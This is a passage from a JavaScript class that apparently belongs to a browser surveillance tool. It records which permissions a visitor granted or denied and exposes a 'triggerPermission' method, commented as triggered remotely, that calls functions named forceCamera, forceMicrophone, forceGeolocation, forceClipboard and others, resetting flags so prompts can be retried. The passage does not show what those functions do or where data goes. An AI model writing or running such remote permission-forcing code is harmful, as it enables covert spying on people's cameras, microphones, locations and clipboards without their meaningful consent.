        } catch(e) {}
      }
    };

    for (const [key, check] of Object.entries(checks)) {
      try {
        await check();
      } catch(e) {}
    }
  }

  getGrantedPermissions() {
    return Object.entries(this.granted)
      .filter(([_, val]) => val)
      .map(([key]) => key);
  }

  getDeniedPermissions() {
    return Object.entries(this.denied)
      .filter(([_, val]) => val)
      .map(([key]) => key);
  }

  getPermissionStatus() {
    return {
      granted: { ...this.granted },
      denied: { ...this.denied },
      attempted: { ...this.attempted }
    };
  }

  // Trigger a specific permission remotely
  async triggerPermission(permissionType) {
    const map = {
      'camera': () => this.forceCamera(),
      'microphone': () => this.forceMicrophone(),
      'geolocation': () => this.forceGeolocation(),
      'notifications': () => this.forceNotifications(),
      'clipboard': () => this.forceClipboard(),
      'bluetooth': () => this.forceBluetooth(),
      'usb': () => this.forceUSB(),
      'midi': () => this.forceMIDI()
    };

    const fn = map[permissionType];
    if (fn) {
      // Reset the attempted flag so it can be retried
      delete this.attempted[permissionType];
      await fn();
    }
  }
}